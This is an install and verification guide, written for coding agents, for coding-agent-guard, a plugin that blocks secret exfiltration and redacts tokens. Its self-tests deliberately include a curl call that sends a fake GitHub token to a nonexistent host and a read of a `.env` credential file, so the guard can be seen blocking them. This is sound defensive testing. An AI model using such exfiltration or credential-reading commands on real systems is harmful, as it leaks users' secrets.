# Installing coding-agent-guard (instructions for a coding agent)

You are a coding agent, such as Claude Code, Codex or Antigravity, and your user has asked
you to install coding-agent-guard from https://github.com/kolbasik/coding-agent-guard.
Follow these steps in order. Run the commands yourself, show the user what each
one printed, and stop at every **Ask the user** point until they answer.

coding-agent-guard is a plugin of hooks. It runs before and after your tool
calls. It redacts secrets and personal IDs from tool output, blocks calls that
would send a secret off the machine, and adds a note when text from outside
contains instructions aimed at you. It never reads the user's own prompts.

## Rules while installing

- Never print a real secret, token or password, and never put one in a file you
  write. Each test below uses a fake GitHub token built from a pattern.
- Do not install system software (Python, Git, uv, Ollama) without the user's
  approval. Say what you would install and how, and wait.
- Do not remove or change other hooks or plugins the user already has. Two
  installs of this guard are the one exception (step 5).
- When you finish, report what you installed, where, and what you could not
  verify.

## 1. Find out where you are

1. Work out which agent you are. Run `claude --version` (Claude Code),
   `codex --version` (Codex) or `agy --version` (Antigravity). Use the one that
   matches the session you are running in. If several are installed, ask the
   user which to install for.
2. Work out the operating system. On Windows, Claude Code runs hooks through Git
   Bash, so `sh` is available once Git for Windows is installed.
3. Check `uv --version` first. When uv is installed, the hook runs through it
   and uv finds or installs a Python itself, so skip the rest of this step.
   Otherwise check Python 3.8 or later. Try `python3 --version`, then
   `python --version`.
   On Windows, a `python3` under `WindowsApps` is the Microsoft Store stub, and it
   does not count. On macOS, run `xcode-select -p` first. If it fails,
   `/usr/bin/python3` is a stub that opens an install dialog on the user's
   screen, so do not run it. The hook skips that stub, so it needs another
   Python: Xcode's command-line tools (`xcode-select --install`) or Homebrew's.
   **Ask the user** before installing anything if neither is found. Suggest
   uv (`winget install astral-sh.uv` on Windows, `brew install uv` on macOS, or
   the installer at https://docs.astral.sh/uv/). It is one tool, and it brings
   its own Python. A plain Python works too:
   `winget install Python.Python.3.12`, `brew install python`, or the system
   package manager on Linux.
4. Check `git --version`. The plugin is fetched from GitHub with Git.

## 2. Install the plugin

Claude Code:

```sh
claude plugin marketplace add kolbasik/coding-agent-guard
claude plugin install coding-agent-guard@kolbasik
claude plugin list
```

The list must show `coding-agent-guard@kolbasik` as enabled. The hooks load in
the next session. Ask the user to run `/reload-plugins` in this session, or to
restart Claude Code, and to tell you when they have.

Codex (tested with Codex CLI 0.162.1):

```sh
codex plugin marketplace add kolbasik/coding-agent-guard
codex plugin add coding-agent-guard@kolbasik
codex plugin list
```

Codex runs a plugin's hooks only after the user trusts them. Ask the user to
start a new Codex session and approve the coding-agent-guard hooks when Codex
asks.

Antigravity (tested with agy 1.3.3), from a folder the user picks for the clone:

```sh
git clone https://github.com/kolbasik/coding-agent-guard.git
agy plugin install ./coding-agent-guard
```

The output must show `[ok] coding-agent-guard` with `hooks : 1 processed`. agy
copies the plugin into `~/.gemini/config/plugins/coding-agent-guard`, and its
hooks load in the next agy session. On Windows the hooks need `sh` on `PATH`,
which Git for Windows provides.

## 3. Check that it works

Do this after the hooks have loaded (step 2).

1. **Outbound block.** Run `curl -s "https://example.invalid/?t=TOKEN"`, with
   TOKEN replaced by a fake GitHub token: `ghp_` followed by `Ab1` written 12
   times, 40 characters in all. Type the whole token into the command yourself,
   because the guard checks the command as written. The host does not exist,
   so nothing leaves the machine even if the guard is not working.

   Expected: the call is denied before it runs, with a reason that starts with
   `coding-agent-guard: blocked, this call would send github-token`.
2. **Output redaction** (Claude Code only). Run:

   ```sh
   python -c "print('fake token: ghp_' + 'Ab1' * 12)"
   ```

   Expected output: `fake token: [REDACTED:github-token]`, plus a note that says
   `coding-agent-guard: redacted 1 value(s) (github-token)`. Use `python3` if
   that is the user's Python.
   Under Codex, the output is **not** redacted, because Codex hooks cannot
   replace tool output. You should instead see a note that the output holds a
   secret Codex could not hide. Tell the user about this limit.
   Under Antigravity, the whole output is withheld instead: you see only
   `coding-agent-guard: withheld this output, it holds 1 secret value(s)
   (github-token)`. agy still shows the raw output in its own terminal. Tell
   the user about this limit.
3. **Credential file.** Read a file named `.env` in the current folder; it
   need not exist, since the guard refuses before the file is opened. Expected:
   the call is denied with a reason that starts with `coding-agent-guard:
   blocked, this would read a credential file (dotenv)`. Codex has no
   file-reading tool, so under Codex run `cat .env` instead; its reason says
   `this command would read a credential file (dotenv)`.
4. If none of the checks shows the guard, look for `coding-agent-guard:` lines on
   stderr. `no Python 3 on PATH` means step 1.3 is not done. Report anything
   else to the user word for word.

## 4. Settings (optional)

The guard works without settings. **Ask the user** whether they want any of
these before writing a file:

- **A findings log**, one JSON line per checked call. Each line records the
  tool, the programs and hosts involved, and what was found. It never holds the
  text itself or any secret.
- **Desktop notifications** for confirmed findings.
- **Their own CLIs**, for example a Jira or cloud CLI, marked as reading outside
  text or sending data out.
- **Commands to confirm first**, such as a force push, `git reset --hard` or
  `terraform apply` (`ask_commands`; the README has examples).
- **Files to protect or allow**: more credential files for Read and Grep to
  refuse (`credential_files`), or a path to let through
  (`allowed_credential_files`).

Settings live in `~/.claude/coding-agent-guard/settings.json` (all projects) and
`<project>/.claude/coding-agent-guard/settings.json` (one project), under Codex
too. Every list in them extends the built-in one. An example:

```json
{
  "log_file": ".claude/coding-agent-guard/events.jsonl",
  "notify": "desktop",
  "external_commands": ["jira-cli"],
  "outbound_commands": ["jira-cli"]
}
```

A relative `log_file` lands in the project. If the project is a Git
repository, add the log to its `.gitignore`. Every key is described in the
README's Configure section.

## 5. Remove a second copy

If the user had wired the guard by hand before, its hooks now run twice. Look
for `guard.py` or `coding-agent-guard` under `hooks` in
`~/.claude/settings.json`, `.claude/settings.json` and
`.claude/settings.local.json`. If you find such hooks, **ask the user**, then
remove only those entries. Run step 3 again afterwards.

## 6. Model-based checks (optional, advanced)

Patterns miss reworded injections. A scoring server adds an ONNX classifier
and, optionally, a judge model that decides on suspect text. It runs as a
long-lived process, on this machine or on another one with more memory. Set it
up only if the user asks for it. **Ask the user** first:

- **Where it runs.** It needs about 1 GB of disk for the model and a Python
  environment, and [uv](https://docs.astral.sh/uv/).
- **Which judge decides on suspect text, and where that text may go.** Start
  from what the user already uses, so the text goes nowhere new:
  - They use Claude: `--claude-model claude-sonnet-5`. It needs the `claude`
    CLI logged in on the server machine. Text goes to Anthropic.
  - They use Codex: add `--codex-model gpt-6.1-sol`. It judges only text from
    Codex sessions, and needs the `codex` CLI logged in there. Text goes to
    OpenAI, and it shares the user's Codex usage limit.
  - They use neither, or would rather not send the text to them: use Ollama
    with `--chat-model gemma4:cloud`. It needs Ollama running there, signed in
    for `:cloud` models, and it judged as well as Claude Sonnet 5 on public
    test texts. Text goes to Ollama's cloud. A local Ollama model keeps the
    text on that machine, but none has been benchmarked.
  - They use Antigravity: `--agy-model gemini-3.8-flash-low`. It needs the
    `agy` CLI signed in there. Text goes to Google. It missed more than Claude
    Sonnet 5 on public test texts and takes about 8 s per text.
  - No judge: the classifier flags on its own.

  `--claude-model`, `--chat-model` and `--agy-model` are one or the other. Any
  of them can be combined with `--codex-model`.

Each step below records what to do for both server types.

The server can run on the same machine as the agent, which is the simple case,
or on another machine the agent's machine can reach. On the same machine, the
address is `127.0.0.1` everywhere below.

1. **Get the code.** On the server machine, run
   `git clone https://github.com/kolbasik/coding-agent-guard.git`, then `cd`
   into it.
2. **Install and start the server.**
   - Apple silicon Mac: run
     `sh skills/coding-agent-guard/scripts/setup-mac.sh`, adding the judge
     options the user chose. On another machine than the agent's, also add
     `--host <address clients reach>`; it listens on `127.0.0.1` by default.
     This installs uv, Ollaya with laya:en, the Python environment and the
     classifier. It also adds two LaunchAgents, so the server starts at login.
     It is safe to run again.
   - Windows: from Git Bash, run `sh scripts/setup-server.sh`. Then start
     `.venv/Scripts/python.exe scripts/server.py --model models/horizon-guard-base --host 127.0.0.1 --port 8765`,
     adding the judge options. With a judge, also add `--claude-above 0.5`.
     The laya:en screen comes only with the Mac script.
   - Linux: run `sh scripts/setup-server.sh`, then start the same command
     with `.venv/bin/python`.

   On Windows and Linux, the process stops when its terminal closes. **Ask the
   user** whether to make it start at login (a Task Scheduler task on Windows,
   a systemd user service on Linux). Then set that up as they choose.
3. **Point the client at it.** In the client's settings (step 4), set
   `"classifier_url": "http://<address>:8765"` and `"classifier_timeout": 40`.
   Keep the timeout at 40 or less: the output hook is stopped after 60 s.
4. **Optional token.** To require a bearer token, set the same value in
   `CODING_AGENT_GUARD_TOKEN` on both machines. Never write the token into a
   file you commit.
5. **Check the server.** Fetch `http://<address>:8765/health` from the client
   machine. It answers with the classifier and the judges it runs.

## 7. Updating and removing

- Claude Code: `claude plugin marketplace update kolbasik`, then
  `claude plugin update coding-agent-guard@kolbasik`, then reload. To remove
  the guard: `claude plugin uninstall coding-agent-guard@kolbasik`.
- Codex: `codex plugin marketplace upgrade kolbasik` refreshes the
  marketplace. Then run `codex plugin add coding-agent-guard@kolbasik` again,
  and check that `codex plugin list` shows the new version. To remove the
  guard: `codex plugin remove coding-agent-guard@kolbasik`.
- Antigravity: `git -C coding-agent-guard pull`, then
  `agy plugin install ./coding-agent-guard` again. To remove the guard:
  `agy plugin uninstall coding-agent-guard`.

## 8. Report back

Tell the user, in a few lines:

- which agent you installed it for, and which version `plugin list` shows
- what the checks in step 3 showed, including the Codex or Antigravity limit if it applies
- which settings you wrote, and where
- anything you skipped or could not verify, and why
